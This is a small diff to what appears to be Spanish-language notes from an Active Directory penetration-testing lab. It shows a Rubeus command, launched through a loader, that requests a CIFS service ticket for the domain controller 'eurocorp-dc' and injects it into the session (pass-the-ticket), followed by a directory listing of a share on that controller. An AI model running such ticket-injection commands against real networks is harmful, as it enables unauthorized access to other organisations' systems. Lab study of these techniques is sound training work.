@@ -1434,3 +1434,8 @@ Se nos generara un ticket en base64 que deberemos de inyectar
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:
 ```
 
+Una vez tenemos el tickete inyectado podemos acceder a los recursosd e *eurocorp-dc*
+```shell
+dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+
+```
